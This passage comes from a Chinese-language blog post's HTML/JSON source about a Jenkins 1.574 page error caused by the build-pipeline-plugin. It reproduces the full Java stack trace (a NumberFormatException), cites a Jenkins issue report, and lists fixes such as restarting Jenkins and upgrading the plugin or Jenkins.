org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:<span class=\"number\">116</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.Server.handle(Server.java:<span class=\"number\">370</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:<span class=\"number\">489</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:<span class=\"number\">949</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:<span class=\"number\">1011</span>)</div><div class=\"line\">\tat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:<span class=\"number\">644</span>)</div><div class=\"line\">\tat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:<span class=\"number\">235</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:<span class=\"number\">82</span>)</div><div class=\"line\">\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:<span class=\"number\">668</span>)</div><div class=\"line\">\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint$<span class=\"number\">1</span>.run(SelectChannelEndPoint.java:<span class=\"number\">52</span>)</div><div class=\"line\">\tat winstone.BoundedExecutorService$<span class=\"number\">1</span>.run(BoundedExecutorService.java:<span class=\"number\">77</span>)</div><div class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class=\"number\">1156</span>)</div><div class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class=\"number\">626</span>)</div><div class=\"line\">\tat java.lang.Thread.run(Thread.java:<span class=\"number\">804</span>)</div><div class=\"line\">Caused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/hudson/model/View/index.jelly:<span class=\"number\">42</span>:<span class=\"number\">43</span>: &lt;st:include&gt; org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:<span class=\"number\">726</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">281</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript$<span class=\"number\">1</span>.run(CallTagLibScript.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class=\"number\">91</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">1</span>.run(CoreTagLibrary.java:<span class=\"number\">98</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">2</span>.run(CoreTagLibrary.java:<span class=\"number\">105</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class=\"number\">120</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript$<span class=\"number\">1</span>.run(CallTagLibScript.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class=\"number\">91</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">2</span>.run(CoreTagLibrary.java:<span class=\"number\">105</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class=\"number\">120</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:<span class=\"number\">44</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:<span class=\"number\">81</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:<span class=\"number\">63</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:<span class=\"number\">53</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:<span class=\"number\">112</span>)</div><div class=\"line\">\t... <span class=\"number\">63</span> more</div><div class=\"line\">Caused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:<span class=\"number\">280</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:<span class=\"number\">92</span>)</div><div class=\"line\">\tat com.sun.proxy.$Proxy56.projectView(Unknown Source)</div><div class=\"line\">\tat lib.JenkinsTagLib$projectView.call(Unknown Source)</div><div class=\"line\">\tat hudson.model.View.main.run(main.groovy:<span class=\"number\">14</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:<span class=\"number\">74</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:<span class=\"number\">62</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:<span class=\"number\">147</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\t... <span class=\"number\">95</span> more</div><div class=\"line\">Caused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:<span class=\"number\">726</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">281</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">1</span>.run(CoreTagLibrary.java:<span class=\"number\">98</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class=\"number\">1</span>.run(ReallyStaticTagLibrary.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class=\"number\">95</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class=\"number\">2</span>.run(CoreTagLibrary.java:<span class=\"number\">105</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class=\"number\">120</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:<span class=\"number\">276</span>)</div><div class=\"line\">\t... <span class=\"number\">103</span> more</div><div class=\"line\">Caused by: java.lang.NumberFormatException: <span class=\"keyword\">null</span></div><div class=\"line\">\tat java.lang.Integer.parseInt(Integer.java:<span class=\"number\">465</span>)</div><div class=\"line\">\tat java.lang.Integer.valueOf(Integer.java:<span class=\"number\">593</span>)</div><div class=\"line\">\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:<span class=\"number\">400</span>)</div><div class=\"line\">\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:<span class=\"number\">866</span>)</div><div class=\"line\">\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:<span class=\"number\">932</span>)</div><div class=\"line\">\tat hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:<span class=\"number\">115</span>)</div><div class=\"line\">\tat jenkins.model.Jenkins.getViews(Jenkins.java:<span class=\"number\">1444</span>)</div><div class=\"line\">\tat sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)</div><div class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class=\"number\">55</span>)</div><div class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:<span class=\"number\">618</span>)</div><div class=\"line\">\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class=\"number\">90</span>)</div><div class=\"line\">\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class=\"number\">233</span>)</div><div class=\"line\">\tat groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:<span class=\"number\">3500</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:<span class=\"number\">61</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:<span class=\"number\">227</span>)</div><div class=\"line\">\tat hudson.model.View.main$_run_closure1.doCall(main.groovy:<span class=\"number\">15</span>)</div><div class=\"line\">\tat sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)</div><div class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class=\"number\">55</span>)</div><div class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:<span class=\"number\">618</span>)</div><div class=\"line\">\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class=\"number\">90</span>)</div><div class=\"line\">\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class=\"number\">233</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:<span class=\"number\">272</span>)</div><div class=\"line\">\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class=\"number\">903</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:<span class=\"number\">66</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:<span class=\"number\">141</span>)</div><div class=\"line\">\tat hudson.model.View.main$_run_closure1.doCall(main.groovy)</div><div class=\"line\">\tat sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)</div><div class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class=\"number\">55</span>)</div><div class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:<span class=\"number\">618</span>)</div><div class=\"line\">\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class=\"number\">90</span>)</div><div class=\"line\">\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class=\"number\">233</span>)</div><div class=\"line\">\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:<span class=\"number\">272</span>)</div><div class=\"line\">\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class=\"number\">903</span>)</div><div class=\"line\">\tat groovy.lang.Closure.call(Closure.java:<span class=\"number\">415</span>)</div><div class=\"line\">\tat groovy.lang.Closure.call(Closure.java:<span class=\"number\">409</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder$<span class=\"number\">1</span>.run(JellyBuilder.java:<span class=\"number\">264</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.CallTagLibScript$<span class=\"number\">1</span>.run(CallTagLibScript.java:<span class=\"number\">99</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class=\"number\">91</span>)</div><div class=\"line\">\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class=\"number\">269</span>)</div><div class=\"line\">\t... <span class=\"number\">111</span> more</div></pre></td></tr></table></figure></p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ol>\n<li><p>重启jenkins服务(自己发现的)<br>服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。</p>\n</li>\n<li><p>尝试升级build-pipeline-plugin。</p>\n</li>\n<li><p>尝试升级jenkins版本。</p>\n</li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" /></p>\n<p>jenkins version: 1.574</p>\n<h2 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h2><p>这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。<br>目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。</p>\n<p><strong>参考</strong>：<a href=\"https://issues.jenkins-ci.org/browse/JENKINS-24102\">Jenkins gives strack trace on main page</a></p>","more":"<h2 id=\"异常堆栈\"><a href=\"#异常堆栈\" class=\"headerlink\" title=\"异常堆栈\"></a>异常堆栈</h2><p>遇到的异常堆栈内容如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div></pre></td><td class=\"code\"><pre><div class=\"line\">A problem occurred <span class=\"keyword\">while</span> processing the request. Please check our bug tracker to see <span class=\"keyword\">if</span> a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think <span class=\"keyword\">this</span> is a <span class=\"keyword\">new</span> issue, please file a <span class=\"keyword\">new</span> issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.</div><div class=\"line\"></div><div class=\"line\">Stack trace</div><div class=\"line\"></div><div class=\"line\">javax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/hudson/model/View/index.jelly:<span class=\"number\">42</span>:<span class=\"number\">43</span>: &lt;st:include&gt; org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:<span class=\"number\">117</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:<span class=\"number\">127</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:<span class=\"number\">717</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class=\"number\">858</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:<span class=\"number\">795</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class=\"number\">858</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class=\"number\">631</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.service(Stapler.java:<span class=\"number\">225</span>)</div><div class=\"line\">\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:<span class=\"number\">848</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:<span class=\"number\">686</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1494</span>)</div><div class=\"line\">\tat hudson.util.PluginServletFilter$<span class=\"number\">1</span>.doFilter(PluginServletFilter.java:<span class=\"number\">96</span>)</div><div class=\"line\">\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:<span class=\"number\">88</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:<span class=\"number\">48</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">84</span>)</div><div class=\"line\">\tat hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:<span class=\"number\">51</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:<span class=\"number\">117</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:<span class=\"number\">125</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:<span class=\"number\">142</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:<span class=\"number\">271</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:<span class=\"number\">174</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:<span class=\"number\">79</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:<span class=\"number\">249</span>)</div><div class=\"line\">\tat hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:<span class=\"number\">67</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:<span class=\"number\">76</span>)</div><div class=\"line\">\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:<span class=\"number\">164</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:<span class=\"number\">46</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:<span class=\"number\">81</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1474</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:<span class=\"number\">499</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:<span class=\"number\">137</span>)</div><div class=\"line\">\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:<span class=\"number\">533</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:<span class=\"number\">231</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:<span class=\"number\">1086</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:<span class=\"number\">428</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:<span class=\"number\">193</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:<span class=\"number\">1020</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:<span class=\"number\">135</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:<span class=\"number\">116</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.Server.handle(Server.java:<span class=\"number\">370</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:<span class=\"number\">489</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:<span class=\"number\">949</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:<span class=\"number\">1011</span>)</div><div class=\"line\">\tat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:<span class=\"number\">644</span>)</div><div class=\"line\">\tat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:<span class=\"number\">235</span>)</div><div class=\"line\">\tat 